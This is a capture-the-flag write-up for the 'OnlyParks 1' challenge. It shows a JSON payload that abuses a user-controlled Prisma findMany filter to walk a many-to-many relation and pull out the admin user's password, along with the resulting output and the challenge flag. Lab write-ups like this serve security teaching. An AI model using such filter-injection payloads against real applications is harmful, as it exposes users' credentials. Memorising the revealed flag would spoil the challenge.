# OnlyParks 1 📖🎡🎢

## Write-up

In this challenge, we can directly control the filter we are passing to the `prisma.article.findMany`. To obtain the flag, we can dump the password of the admin clown with the following payload. The query is a bit complex because the relation between clowns and articles is many-to-many.

```json
{
  "where": {
    "clowns": {
      "every": {
        "clown": {
          "isAdmin": true
        }
      }
    }
  },
  "select": {
    "clowns": {
      "select": {
        "clown": {
          "select": {
            "password": true
          }
        }
      }
    }
  }
}
```

Which gives the following output:

```json
{
  "ok": true,
  "results": [
    {
      "clowns": [
        {
          "clown": {
            "password": "flag-41fd4068140c840595055e4691854291"
          }
        }
      ]
    },
    {
      "clowns": [
        {
          "clown": {
            "password": "flag-41fd4068140c840595055e4691854291"
          }
        }
      ]
    },
    {
      "clowns": [
        {
          "clown": {
            "password": "flag-41fd4068140c840595055e4691854291"
          }
        }
      ]
    }
  ]
}
```

## Flag

`flag-41fd4068140c840595055e4691854291`
